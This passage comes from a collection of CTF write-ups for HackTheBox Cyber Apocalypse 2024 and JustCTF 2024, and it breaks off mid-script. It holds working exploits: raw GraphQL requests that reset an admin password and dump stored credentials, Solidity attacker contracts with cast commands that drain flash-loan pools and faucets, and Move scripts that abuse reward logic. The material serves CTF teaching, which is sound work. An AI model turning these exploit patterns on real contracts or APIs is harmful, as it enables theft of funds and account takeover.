en-US,en;q=0.9,fa;q=0.8\nConnection: close\nCookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjB4MTciLCJpc19hZG1pbiI6MCwiaWF0IjoxNjc5Nzk3MDQ0fQ.54ogANqo_0hbJBlo_RtgWQDOoUQ3qeRz7ayBqW4KosU\n\n{\n  \"query\": \"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }\",\n  \"variables\": {\n    \"username\": \"admin\",\n    \"password\": \"1234\"\n  }\n}\n</code></pre> <p>And here is the response:</p> <pre><code>{\n  \"data\": {\n    \"UpdatePassword\": {\n      \"message\": \"Password updated successfully!\",\n      \"token\": null\n    }\n  }\n}\n</code></pre> <p>It seems we changed admin's password, Let's check it\\ Yes, we logged in as admin and now we can see admin's notes inside saved_password table which is actually the flag</p> <pre><code>POST /graphql HTTP/1.1\nHost: 138.68.162.218:32084\nContent-Length: 84\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept: */*\nOrigin: http://138.68.162.218:32084\nReferer: http://138.68.162.218:32084/dashboard\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,fa;q=0.8\nCookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOjEsImlhdCI6MTY3OTc5ODMyOH0.uZ5Bqop3SSoHX4cgxHZn6kJLKXT3CX3d3wz9WLE4bRw\nConnection: close\n\n{\n  \"query\": \"{ getPhraseList { id, owner, type, address, username, password, note } }\"\n}\n</code></pre> <pre><code>{\n  \"data\": {\n    \"getPhraseList\": [\n      {\n        \"id\": \"1\",\n        \"owner\": \"admin\",\n        \"type\": \"Web\",\n        \"address\": \"igms.htb\",\n        \"username\": \"admin\",\n        \"password\": \"HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}\",\n        \"note\": \"password\"\n      }\n    ]\n  }\n}\n</code></pre> <p>And here is the flag: <pre><code>HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}\n</code></pre></p>"},{"location":"2024/Cyber-Aplocalypse-2024/","title":"HackTheBpx CyberApocalypse 2024","text":""},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/ledgerheist/","title":"challenge name","text":""},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/ledgerheist/#code-description","title":"code / Description","text":"<pre><code>function deposit(uint256 amount) external {\n    address _msgsender = msg.sender;\n\n    _updateFees(_msgsender);\n    IERC20Minimal(underlying).transferFrom(_msgsender, address(this), amount);\n\n    _mint(_msgsender, amount);\n}\n</code></pre> <pre><code>function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)\n    external\n    returns (bool)\n{\n    if (token != underlying) {\n        revert NotSupported(token);\n    }\n\n    IERC20Minimal _token = IERC20Minimal(underlying);\n    uint256 _balanceBefore = _token.balanceOf(address(this));\n\n    if (amount &gt; _balanceBefore) {\n        revert InsufficientBalance();\n    }\n\n    uint256 _fee = _computeFee(amount);\n    _token.transfer(address(receiver), amount);\n\n    if (\n        receiver.onFlashLoan(msg.sender, underlying, amount, _fee, data)\n            != keccak256(\"ERC3156FlashBorrower.onFlashLoan\")\n    ) {\n        revert CallbackFailed();\n    }\n\n    uint256 _balanceAfter = _token.balanceOf(address(this));\n    if (_balanceAfter &lt; _balanceBefore + _fee) {\n        revert LoanNotRepaid();\n    }\n\n    // Accumulate fees and update feePerShare\n    uint256 interest = _balanceAfter - _balanceBefore;\n    feePerShare += interest.fixedDivFloor(totalSupply, BONE);\n\n    emit FlashLoanSuccessful(address(receiver), msg.sender, token, amount, _fee);\n    return true;\n}\n</code></pre>"},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/ledgerheist/#challenge-analysis","title":"Challenge Analysis","text":"<p>This challenge revolves around a smart contract that implements a flash loan feature, which allows borrowing assets with the obligation of returning them within the same transaction. The vulnerability arises from improper handling of the loan repayment mechanism. The contract permits the depositing of flash-loaned assets directly back into the pool without proper validation of the repayment source or completion status. This flaw, combined with a faulty deposit function, results in the minting of tokens to the sender and improperly assigns credit, which the sender can later withdraw, leading to the potential draining of ETH from the contract.</p>"},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/ledgerheist/#solution","title":"Solution","text":"<ol> <li>Deploy Attacker Contract: First, deploy an attacker contract implementing IERC3156FlashBorrower. In the constructor of this contract, set the target flash loan pool, approve the flash loan amount, and prepare for receiving the loan by setting the maximum loan amount and ensuring the contract can handle the token involved.</li> </ol> <pre><code>contract BadBorrower is IERC3156FlashBorrower {\n    address target;\n    uint maxloan;\n    address underlying;\n\n    constructor(address _target) {\n        target = _target;\n        underlying = ILoanPool(_target).underlying(); \n        maxloan = ILoanPool(_target).maxFlashLoan(underlying);\n\n        try IToken(underlying).approve(_target, type(uint256).max) {} catch {\n            revert(\"cant add LoanPool to attacker allowancea\");\n        }\n    }\n\n    function onFlashLoan(\n        address initiator,\n        address token,\n        uint256 amount,\n        uint256 fee,\n        bytes calldata data\n    ) public returns (bytes32) {\n        ILoanPool(msg.sender).deposit(amount);\n        IToken(token).transferFrom(tx.origin, msg.sender, fee);\n        return keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n    }\n\n    function withdraw() public {\n        try ILoanPool(target).withdraw(maxloan) {\n        } catch {\n            revert(\"cant withdraw!\");   \n        }\n    }\n}\n</code></pre> <ol> <li>Approve Attacker Contract: Next, approve the attacker contract to transfer the required token amount to the flash loan contract to cover the flash loan fee. This is necessary to meet the requirements of the flash loan mechanism, specifically for repayment.</li> </ol> <pre><code>cast send &lt;UNDERLYING_TOKEN_ADDRESS&gt; \"approve(address,uint256)\" &lt;TARGET_CONTRACT_ADDRESS&gt; 9999999999999999999999 --rpc-url &lt;RPC_URL&gt; --private-key &lt;PRIVATE_KEY&gt;\n</code></pre> <ol> <li>Initiate Flash Loan: Trigger a flash loan from the attacker contract. The onFlashLoan function within this contract is designed to misuse the deposit mechanism: it deposits the flash-loaned amount back into the loan pool, exploiting the flawed logic to mint new tokens or credit to the attacker contract.</li> </ol> <pre><code>cast send &lt;TARGET_CONTRACT_ADDRESS&gt; \"flashLoan(IERC3156FlashBorrower,address,uint256,bytes)\" &lt;ATTACKER_CONTRACT_ADDRESS&gt; &lt;UNDERLYING_TOKEN_ADDRESS&gt; 10000000000000000000 0x --rpc-url &lt;RPC_URL&gt; --private-key &lt;PRIVATE_KEY&gt;\n</code></pre> <ol> <li>Handle Loan and Fee in onFlashLoan: Within the onFlashLoan execution context the borrowed tokens are deposited back into the pool using the deposit function. This action satisfies the loan's return requirements while simultaneously credits the sender and mints additional tokens, effectively leveraging the return of the loaned tokens. Subsequently, the loan fee is paid from the external owner's account (EOA). This step ensures that the flash loan requirements are met.</li> </ol> <pre><code>ILoanPool(msg.sender).deposit(amount);\nIToken(token).transferFrom(tx.origin, msg.sender, fee);\n</code></pre> <ol> <li>Withdraw Assets: Finally, call the withdraw function on the attacker contract, which, in turn, calls the withdraw function on the flash loan contract. Since the attacker contract's balance has been artificially inflated through the earlier deposit, this step allows withdrawing more assets than should be possible, effectively draining ETH from the flash loan contract.</li> </ol> <pre><code>cast send &lt;ATTACKER_CONTRACT_ADDRESS&gt; \"withdraw()\" --rpc-url &lt;RPC_URL&gt; --private-key &lt;PRIVATE_KEY&gt;\n</code></pre> <p>AUTHOR:</p> <p>Mohammad2024 / Pr1m3d Team</p>"},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/luckyfaucet/","title":"Lucky Faucet","text":""},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/luckyfaucet/#code-description","title":"code / Description","text":"<pre><code>function setBounds(int64 _newLowerBound, int64 _newUpperBound) public {\n    require(_newUpperBound &lt;= 100_000_000, \"100M wei is the max upperBound sry\");\n    require(_newLowerBound &lt;=  50_000_000,  \"50M wei is the max lowerBound sry\");\n    require(_newLowerBound &lt;= _newUpperBound);\n    upperBound = _newUpperBound;\n    lowerBound = _newLowerBound;\n}\n</code></pre> <pre><code>function sendRandomETH() public returns (bool, uint64) {\n    int256 randomInt = int256(blockhash(block.number - 1));\n    uint64 amountToSend = uint64(randomInt % (upperBound - lowerBound + 1) + lowerBound); \n    bool sent = msg.sender.send(amountToSend);\n    return (sent, amountToSend);\n}\n</code></pre>"},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/luckyfaucet/#challenge-analysis","title":"Challenge Analysis","text":"<p>The \"Lucky Faucet\" challenge involves a smart contract designed to send a random amount of ETH based on a pseudo-random number derived from the blockhash and the set bounds. The critical flaw lies in the handling of integer underflow when setting the bounds, allowing for unexpected behavior when calculating the amount of ETH to send.</p>"},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/luckyfaucet/#solution","title":"Solution","text":"<p>The solution exploits the type casting vulnerability by setting the upperBound and lowerBound such that the calculation randomInt % (upperBound - lowerBound + 1) + lowerBound results in a negative value. When this negative value is cast to an unsigned integer (uint64), it becomes a very large positive number, thereby exploiting the contract to send a large amount of ETH. This is achieved by calling setBounds with values that lead to a negative outcome for the amount to send, and then invoking sendRandomETH to trigger the flawed logic and cast the negative result to an unexpectedly large positive value.</p> <p>Adjust both upperBound and lowerBound to -1, ensuring that the expression randomInt % (upperBound - lowerBound + 1) consistently equals zero. Consequently, the amountToSend will always be equal to lowerBound.</p>"},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/luckyfaucet/#final-exploit","title":"Final Exploit","text":"<pre><code>cast send --rpc-url &lt;RPC_URL&gt; --private-key &lt;PRIVATE_KEY&gt; &lt;TARGET_CONTRACT_ADDRESS&gt; \"setBounds(int64,int64)\" -- -1 -1 \n</code></pre> <pre><code>cast send --rpc-url &lt;RPC_URL&gt; --private-key &lt;PRIVATE_KEY&gt; &lt;TARGET_CONTRACT_ADDRESS&gt; \"sendRandomETH()\"\n</code></pre> <p>AUTHOR:</p> <p>Mohammad2024 / Pr1m3d Team</p>"},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/russianroulette/","title":"challenge name","text":"<p>Russian Roulette</p>"},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/russianroulette/#code-description","title":"code / Description","text":"<pre><code>function pullTrigger() public returns (string memory) {\n    if (uint256(blockhash(block.number - 1)) % 10 == 7) {\n        selfdestruct(payable(msg.sender)); // \ud83d\udc80\n    } else {\n    return \"im SAFU ... for now\";\n    }\n}\n</code></pre>"},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/russianroulette/#challenge-analysis","title":"Challenge Analysis","text":"<p>The \"RussianRoulette\" challenge contains a Solidity function that calculates a modulo 10 of the previous block's hash; if the result is 7, it triggers self-destruction of the contract.</p>"},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/russianroulette/#solution","title":"Solution","text":"<p>The solution involves repeatedly calling the pullTrigger() function within the smart contract until the condition where the previous block's hash modulo 10 equals 7 is met, leading to the contract's self-destruction.</p>"},{"location":"2024/Cyber-Aplocalypse-2024/blockchain/russianroulette/#final-exploit-code-optional","title":"Final Exploit code (optional)","text":"<p>send this transaction until the contract's self-destruction:</p> <pre><code>cast send &lt;TARGET_CONTRACT_ADDRESS&gt; \"pullTrigger()\" --private-key &lt;PRIVATE_KEY&gt; --rpc-url &lt;RPC_URL&gt;\n</code></pre> <p>AUTHOR:</p> <p>Mohammad2024 / Pr1m3d Team</p>"},{"location":"2024/Cyber-Aplocalypse-2024/crypto/permuted/","title":"Permuted","text":""},{"location":"2024/Cyber-Aplocalypse-2024/crypto/permuted/#code-description","title":"code / Description","text":"<pre><code>from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Util.number import long_to_bytes\n\nfrom hashlib import sha256\nfrom random import shuffle\n\nfrom secret import a, b, FLAG\n\nclass Permutation:\n    def __init__(self, mapping):\n        self.length = len(mapping)\n\n        assert set(mapping) == set(range(self.length))     # ensure it contains all numbers from 0 to length-1, with no repetitions\n        self.mapping = list(mapping)\n\n    def __call__(self, *args, **kwargs):\n        idx, *_ = args\n        assert idx in range(self.length)\n        return self.mapping[idx]\n\n    def __mul__(self, other):\n        ans = []\n\n        for i in range(self.length):\n            ans.append(self(other(i)))\n\n        return Permutation(ans)\n\n    def __pow__(self, power, modulo=None):\n        ans = Permutation.identity(self.length)\n        ctr = self\n\n        while power &gt; 0:\n            if power % 2 == 1:\n                ans *= ctr\n            ctr *= ctr\n            power //= 2\n\n        return ans\n\n    def __str__(self):\n        return str(self.mapping)\n\n    def identity(length):\n        return Permutation(range(length))\n\n\nx = list(range(50_000))\nshuffle(x)\n\ng = Permutation(x)\nprint('g =', g)\n\nA = g**a\nprint('A =', A)\nB = g**b\nprint('B =', B)\n\nC = A**b\nassert C.mapping == (B**a).mapping\n\nsec = tuple(C.mapping)\nsec = hash(sec)\nsec = long_to_bytes(sec)\n\nhash = sha256()\nhash.update(sec)\n\nkey = hash.digest()[16:32]\niv = b\"mg'g\\xce\\x08\\xdbYN2\\x89\\xad\\xedlY\\xb9\"\n\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\nencrypted = cipher.encrypt(pad(FLAG, 16))\nprint('c =', encrypted)\n</code></pre>"},{"location":"2024/Cyber-Aplocalypse-2024/crypto/permuted/#challenge-analysis","title":"Challenge Analysis","text":"<p>this challenge is about groups, we have a group which its elements are different permutation of numbers from <code>0</code> to <code>n-1</code>. our groups is defined by a Class named <code>Permutation</code>.</p> <p>In case of a groups we should have couple of elements </p> <ol> <li> <p>Identity Element which is defined by a function named <code>identity</code> like this <pre><code>def identity(length):\n    return Permutation(range(length))\n</code></pre> it will create a permutation of numbers which are sorted <code>(0,1,2,...,n-1)</code>, so this would be our identity element</p> </li> <li> <p>Operations</p> </li> </ol> <p>Multiplication</p> <p>this operation is defined by this function</p> <pre><code>def __mul__(self, other):\n    ans = []\n\n    for i in range(self.length):\n        ans.append(self(other(i)))\n\n    return Permutation(ans)\n</code></pre> <p>Imagine we have two elements like this</p> <p> \\(g_1 = {4,2,3,1,0}\\) <p>\\(g_2 = {2,3,0,1,4}\\) </p> <p>we want to multiply these two elements, multiplication operation is defined like this</p> <p> \\(g_1 \\times g_2 = g_1[g_2[i]] \\quad for \\quad i=0,1,2, \\ldots ,n-1\\) </p> <p>so the multiplication of \\(g_1 \\times g_2\\) will be</p> <p> \\(g_1 \\times g_2 = {3,1,4,2,0}\\) </p> <p>Exponentiation</p> <p>this operation is defined by this function</p> <pre><code>def __pow__(self, power, modulo=None):\n    ans = Permutation.identity(self.length)\n    ctr = self\n\n    while power &gt; 0:\n        if power % 2 == 1:\n            ans *= ctr\n        ctr *= ctr\n        power //= 2\n\n    return ans\n</code></pre> <p>exponentiation by power <code>n</code> is defined by multiplying an element <code>g</code> for <code>n</code> times with itself</p> <p> \\(g^n = \\underbrace{g \\times g \\times g \\times g}_{n \\text{ times}}\\) </p> <p>there is an optimal algorithm for exponentiation which is done in \\(O(logn)\\) instead of \\(O(n)\\), in cases of large <code>n</code> this algorithm is better and feasable</p> <pre><code>input : g, n\noutput : g^n\n\nctr = g\nwhile power &gt; 0:\n    if power % 2 == 1:\n        ans *= ctr\n    ctr *= ctr\n    power //= 2\nreturn ctr\n</code></pre> <p>This was the Permutation group class. now let's see what is the exact problem</p> <pre><code>x = list(range(50_000))\nshuffle(x)\n\ng = Permutation(x)\nprint('g =', g)\n\nA = g**a\nprint('A =', A)\nB = g**b\nprint('B =', B)\n\nC = A**b\nassert C.mapping == (B**a).mapping\n\nsec = tuple(C.mapping)\nsec = hash(sec)\nsec = long_to_bytes(sec)\n\nhash = sha256()\nhash.update(sec)\n\nkey = hash.digest()[16:32]\niv = b\"mg'g\\xce\\x08\\xdbYN2\\x89\\xad\\xedlY\\xb9\"\n\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\nencrypted = cipher.encrypt(pad(FLAG, 16))\nprint('c =', encrypted)\n</code></pre> <ol> <li>the code creates a random permutation of numbers from 0 to 49999 named g</li> <li>then it calculates power \\(a\\) and \\(b\\) of \\(g\\) and name them \\(A,B\\). The exponents \\(a,b\\) are secret</li> <li>then it will calculate a \\(C\\) like \\(C = A^b\\) or \\(C = B^a\\), because of associative propery of this group \\(A^b = B^a = g^{ab}\\)</li> <li>Finally it will create a hash for \\(C\\) named secret and it will encrypt the flag with sha256 hash of this secret</li> </ol> <p>So we have a DLP (Discrete Logarithm Problem) here. we have a generator <code>g</code> and two secrets <code>a,b</code> and the power <code>a,b</code> of the <code>g</code> which are <code>A,B</code>. If we can find one of <code>a,b</code> values we can calculate <code>C</code> and the secret key and decrypt the flag.</p>"},{"location":"2024/Cyber-Aplocalypse-2024/crypto/permuted/#solution","title":"Solution","text":"<p>let's first see what is the order of our generator <code>g</code>. order of a generator in a group is lowest possible value \\(x\\) such that g to the power of \\(x\\) is equal to identity element</p> <p> \\(g^x = e\\) </p> <p></p> <p>as we see the order of random generator is dependant on the elements of that generator. and computing order of a random <code>g</code> with this size (50000 elements!) is not feasable and requires a lot of trial/error and calculation. so what should we do now? brute force the <code>a,b</code> and iterate though all possible values to see when we can reach <code>A</code> or <code>B</code>. that's not a good idea because in case of a DLP problem <code>a,b</code> are secret and high enough to prevent brute forcing and that's the trapdoor function of a DLP. becaue calculating the exponent is easy enough because of the algorithm we discussed in previous section but the reverse operation is not practical in feasable time.</p> <p>When discussing with one of my good crypto player friends(I name him Ehsan Crypto :D) he mentioned we can calculate each elements period independantly to see after how many iteration each element resides its correct location. for example value 0 may be seen in first element section after \\(x_1\\) loops (\\(g^{x_1}\\)). value 1 may be in its correct position after \\(x_2\\) loops (\\(g^{x_2}\\)) and so on. so we can calculate each element's order seperately and see what's happening. let's see another example with 50 elements</p> <p></p> <p>the order of the <code>g</code> is 390. but the order of each element is either 39 or 10 and we know that \\(390 = 10 \\times 39\\). so the order of the whole <code>g</code> is LCM (Least Common Multiple) of each elements period. now we can find the order of whole <code>g</code>.</p> <p></p> <p>Now let's write a code to find order of generator <code>g</code></p> <pre><code>n = 50000\n\ng = Permutation(g)\nA = Permutation(A)\nB = Permutation(B)\n\ne = Permutation(list(range(50000)))\nperiods = {i:0 for i in range(len(g.mapping))}\n\ni = 2\nwhile not all(periods.values()):\n    mul = g**i\n    for j in range(len(g.mapping)):\n        if (mul).mapping[j] == e.mapping[j] and periods[j] == 0:\n            periods[j] = i\n    i += 1\n\norder = lcm(*list(periods.values()))\nprint(order)\n</code></pre> <p>and here is order of g: <pre><code>3311019189498977856900\n</code></pre></p> <p>tbh there is no need to calculate the order of <code>g</code> lol, but anyway. before we explain our solution, let's define these terms</p> <p>\\(X_i\\) is period or order of element \\(g[i]\\) if:</p> <p> \\(g^{X_i}[i] = e[i] \\quad for \\quad i=0,1,2,...,n-1\\) </p> <p>\\(Y_i\\) is distance of element \\(g[i]\\) from \\(A[i]\\) if:</p> <p> \\(g^{Y_i}[i] = A[i] \\quad for \\quad i=0,1,2,...,n-1\\) </p> <p>now we have the order and we should see how much distance each element of <code>g</code> has from its coresponding element in <code>A</code>. The reason that we wanna mesaure this distance is to find secret value <code>a</code> or <code>b</code>, but how these are related? we need to find just one of them so I pick <code>a</code>. we know that <code>a</code> and <code>b</code> are a large value(they should be) and each element of <code>g</code>'s period (the periods array we calculated in previous python code) are less than <code>a</code> or <code>b</code>. we have <code>n</code> equations like this</p> <p> \\(a \\equiv Y[i] \\mod{X[i]} \\quad for \\quad i=0,1,2,...,n-1\\) </p> <p>now we have 50000 modular equations. we can use CRT (chinese Remainder Theorem) to find \\(a\\).</p> <p>First we calculated all moduli and residue with this python code</p> <pre><code>n = 50000\n\ngg = Permutation(g)\nAA = Permutation(A)\nBB = Permutation(B)\n\ne = Permutation(list(range(n)))\nperiods = {i:0 for i in range(len(gg.mapping))}\nresidues = {i:0 for i in range(len(gg.mapping))}\n\n\ni = 2\nwhile not all(periods.values()):\n    mul = gg**i\n    for j in range(len(gg.mapping)):\n        if mul.mapping[j] == e.mapping[j] and periods[j] == 0:\n            periods[j] = i\n        if mul.mapping[j] == AA.mapping[j] and residues[j] == 0:\n            residues[j] = i\n    i += 1\n</code></pre> <p>then we use sage <code>crt</code> function to find the secret value <code>a</code>.</p> <pre><code>a = crt(list(residues.values()), list(periods.values()))\nprint(a)\n839949590738986464\n</code></pre> <p>now we have the secret value <code>a</code>, we can first verify if <code>a</code> is correct then easily calulate <code>C</code> and <code>secret</code> and findally decrpt the flag:</p> <pre><code>a = 839949590738986464\nC = B ** a\nsec = tuple(C.mapping)\nsec = hash(sec)\nprint(f\"{sec=}\")\n\nsec = long_to_bytes(sec)\n\nhash = sha256()\nhash.update(sec)\nkey = hash.digest()[16:32]\n\nprint(f\"key = {key.hex()}\")\n</code></pre> <p>here is the AES key</p> <pre><code>a0e58d9b8a93cc1b17e60110bb59cc2a\n</code></pre> <p></p> <p>finally I used cyberchef to decrypt the flag</p> <p></p>"},{"location":"2024/Cyber-Aplocalypse-2024/crypto/permuted/#final-code","title":"Final code","text":"<p>here is the final code (without g,A,B matrix because of large amount of data)</p> <pre><code>from hashlib import sha256\nfrom math import lcm\nfrom sage.all import *\nfrom Crypto.Util.number import *\n\nclass Permutation:\n    def __init__(self, mapping):\n        self.length = len(mapping)\n\n        assert set(mapping) == set(range(self.length))     # ensure it contains all numbers from 0 to length-1, with no repetitions\n        self.mapping = list(mapping)\n\n    def __call__(self, *args, **kwargs):\n        idx, *_ = args\n        assert idx in range(self.length)\n        return self.mapping[idx]\n\n    def __mul__(self, other):\n        ans = []\n\n        for i in range(self.length):\n            ans.append(self(other(i)))\n\n        return Permutation(ans)\n\n    def __pow__(self, power, modulo=None):\n        ans = Permutation.identity(self.length)\n        ctr = self\n\n        while power &gt; 0:\n            if power % 2 == 1:\n                ans *= ctr\n            ctr *= ctr\n            power //= 2\n\n        return ans\n\n    def __str__(self):\n        return str(self.mapping)\n\n    def identity(length):\n        return Permutation(range(length))\n\n\nn = 50000\n\ngg = Permutation(g)\nAA = Permutation(A)\nBB = Permutation(B)\n\ne = Permutation(list(range(n)))\nperiods = {i:0 for i in range(len(gg.mapping))}\nresidues = {i:0 for i in range(len(gg.mapping))}\n\n\ni = 2\nwhile not all(periods.values()):\n    mul = gg**i\n    for j in range(len(gg.mapping)):\n        if mul.mapping[j] == e.mapping[j] and periods[j] == 0:\n            periods[j] = i\n        if mul.mapping[j] == AA.mapping[j] and residues[j] == 0:\n            residues[j] = i\n    i += 1\n\n# order of g is not necessary\norder = lcm(list(periods.values()))\nprint(f\"order of g : {order}\")\n\na = crt(list(residues.values()), list(periods.values()))\nprint(f\"secret value a : {a}\")\n\nassert (gg**a).mapping==AA.mapping\n\nC = BB ** a\nsec = tuple(C.mapping)\nsec = hash(sec)\nprint(f\"sec : {sec}\")\n\nsec = long_to_bytes(sec)\n\nkey = sha256(sec).digest()[16:32]\nprint(f\"aes key : {key.hex()}\")\n</code></pre>"},{"location":"2024/Cyber-Aplocalypse-2024/crypto/permuted/#flag","title":"Flag","text":"<p>Here is the flag <pre><code>HTB{w3lL_n0T_aLl_gRoUpS_aRe_eQUaL_!!}\n</code></pre></p> <p>AUTHOR:</p> <p>pi3 / Pr1m3d Team</p> <p>Great thanks to our friend Ehsan for helping us to solve this challenge &lt;3</p>"},{"location":"2024/JustCTF2024/","title":"JustCTF 2024","text":""},{"location":"2024/JustCTF2024/blockchain/blockchains/","title":"blockchain","text":"<p>[#1 The Otter Scrolls]</p> <p>To solve this level, we need to call the <code>cast_spell</code> function with the correct sequence of indices to set the <code>casted</code> attribute of the <code>Spellbook</code> to <code>true</code>. The function checks specific magic words in sequence: \"Inferno\" (fire), \"Zephyr\" (wind), \"Call\" (water), \"Granite\" (earth), and \"Wazzup\" (power).</p> <p>We determined the indices for these words in their respective vectors and constructed the sequence <code>[1, 0, 3, 3, 3]</code>. This sequence corresponds to the required magic words in the correct order. By calling <code>cast_spell</code> with this sequence and verifying with <code>check_if_spell_casted</code>, we ensure the spell is successfully cast.</p> <p><code>solve.move</code> script: <pre><code>module solve::solve {\n    // [*] Import dependencies\n    use challenge::theotterscrolls;\n    public fun solve(\n        _spellbook: &amp;mut theotterscrolls::Spellbook,\n        _ctx: &amp;mut TxContext\n    ) {\n        // Your code here...\n        let spell_sequence = vector[1, 0, 3, 3, 3];\n        theotterscrolls::cast_spell(spell_sequence, _spellbook);\n    }\n}\n</code></pre> <pre><code>Flag: justCTF{Th4t_sp3ll_looks_d4ngerous...keep_y0ur_distance}\n</code></pre></p> <p>[#2 Dark BrOTTERhood]</p> <p>To solve this level, we need to interact with the smart contract by calling several functions to register a player, equip them with a sword, find and fight monsters, get the rewards, and ultimately prove the solution.</p> <p>The root cause of the problem is these lines in the <code>get_the_reward</code> function: <pre><code>    public fun get_the_reward(quest_id: u64, ...) {\n        // check status with quest_id\n        let quest_to_claim = vector::borrow_mut(&amp;mut board.quests, quest_id);\n        assert!(quest_to_claim.fight_status == FINISHED, WRONG_STATE);\n\n        // but pop last index instead of quest_id\n        let monster = vector::pop_back(&amp;mut board.quests);\n        ...\n    }\n</code></pre></p> <p>The check is correctly performed against the quest_id, ensuring the fight_status is FINISHED. However, the pop_back function removes and returns the last element in the vector and the reward is mistakenly based on the last element of the vector rather than the quest at the quest_id index. This mismatch leads to inconsistencies and errors in the quest state management.</p> <p><code>solve.move</code>: <pre><code>module solve::solve {\n    // [*] Import dependencies\n    use challenge::Otter::{Self, OTTER};\n    use sui::random::Random;\n    #[allow(lint(public_random))]\n    public fun solve(\n        _vault: &amp;mut Otter::Vault&lt;OTTER&gt;,\n        _questboard: &amp;mut Otter::QuestBoard,\n        _player: &amp;mut Otter::Player,\n        _r: &amp;Random,\n        _ctx: &amp;mut TxContext,\n    ) {\n        // Your code here ...\n        // buy sword and defead at least one monster\n        Otter::buy_sword(_vault, _player, _ctx);\n        Otter::find_a_monster(_questboard, _r, _ctx);\n        Otter::fight_monster(_questboard, _player, 0);\n        Otter::return_home(_questboard, 0);\n\n        let times: u64 = 100;\n        let mut i: u64 = 0;\n        while (i &lt; times) {\n            // add new monster at the end of quest vector\n            Otter::find_a_monster(_questboard, _r, _ctx);\n            // use defeated monter quest_id to get reward\n            Otter::get_the_reward(_vault, _questboard, _player, 0, _ctx);\n            i = i + 1;\n        };\n\n        // but flag\n        let flag = Otter::buy_flag(_vault, _player, _ctx);\n        Otter::prove(_questboard, flag);\n    }\n}\n</code></pre> <pre><code>Flag: justCTF{I_us3d_to_b3_an_ott3r_until_i_t00k_th4t_arr0w}\n</code></pre></p> <p>[#3 World of Ottercraft]</p> <p>The vulnerability in this challenge stems from the fact that the get_the_reward function does not verify monster power before awarding the reward. Instead, it simply pops the monster from the vector and grants the reward. Here\u2019s the relevant code from the get_the_reward function:</p> <pre><code>public fun get_the_reward(vault: &amp;mut Vault&lt;OTTER&gt;, board: &amp;mut QuestBoard, player: &amp;mut Player, ctx: &amp;mut TxContext) {\n    assert!(player.status != RESTING &amp;&amp; player.status != PREPARE_FOR_TROUBLE &amp;&amp; player.status != ON_ADVENTURE, WRONG_PLAYER_STATE);\n    // pop monter\n    let monster = vector::remove(&amp;mut board.quests, player.quest_index);\n    ...\n    // get reward from vault\n    let coins = coin::split(&amp;mut vault.cash, reward, ctx); \n    ...\n    // send reward to player\n    balance::join(&amp;mut player.wallet, balance);\n\n    player.status = RESTING;\n}\n</code></pre> <p>In contrast, the return_home function, which should be called before get_the_reward, includes a crucial check to ensure that the monster's power is zero (indicating the monster has been defeated):</p> <pre><code>public fun return_home(board: &amp;mut QuestBoard, player: &amp;mut Player) {\n    assert!(player.status != SHOPPING &amp;&amp; player.status != FINISHED &amp;&amp; player.status != RESTING &amp;&amp; player.status != PREPARE_FOR_TROUBLE, WRONG_PLAYER_STATE);\n\n    let quest_to_finish = vector::borrow(&amp;board.quests, player.quest_index);\n    assert!(quest_to_finish.power == 0, WRONG_AMOUNT);\n\n    player.status = FINISHED;\n}\n</code></pre> <p>Exploiting the Vulnerability</p> <p>To exploit this vulnerability, we need to avoid calling return_home and directly call get_the_reward. This can be achieved if we can enter the get_the_reward function while the player's status is SHOPPING, which can be done by calling the enter_tavern function. The following sequence of operations allows us to repeatedly call get_the_reward without the necessary checks.</p> <pre><code>module solve::solve {\n    // [*] Import dependencies\n    use challenge::Otter::{Self, OTTER};\n    public fun solve(\n        _board: &amp;mut Otter::QuestBoard,\n        _vault: &amp;mut Otter::Vault&lt;OTTER&gt;,\n        _player: &amp;mut Otter::Player,\n        _ctx: &amp;mut TxContext\n    ) {\n        // Your code here...\n        // buy sword because we need to defeat monter to change state\n        let mut ticket = Otter::enter_tavern(_player);\n        Otter::buy_sword(_player, &amp;mut ticket);\n        Otter::checkout(ticket, _player, _ctx, _vault, _board);\n\n        // add monter to vector so get_the_reward function can pop them later\n        let num_quests: u64 = 24;\n        let mut i: u64 = 0;\n        while (i &lt; num_quests) {\n            Otter::find_a_monster(_board, _player);\n            i = i + 1;\n        };\n\n        // continue scenario to reach RESTING status again\n        Otter::bring_it_on(_board, _player, 0);\n        Otter::return_home(_board, _player);\n        Otter::get_the_reward(_vault, _board, _player, _ctx);\n\n        // now we have full vector of monters we can set status to SHOPPING and loop over get_the_reward\n        i = 0;\n        while (i &lt; num_quests - 1) {\n            // enter SHOPPING status\n            let mut shield_ticket = Otter::enter_tavern(_player);\n            // buy something cheap just so we can checkout later\n            Otter::buy_shield(_player, &amp;mut shield_ticket);\n            // enter get_the_reward in SHOPPING status and get reward without defeating monter\n            Otter::get_the_reward(_vault, _board, _player, _ctx);\n            // checkout because we need to use shield_ticket\n            Otter::checkout(shield_ticket, _player, _ctx, _vault, 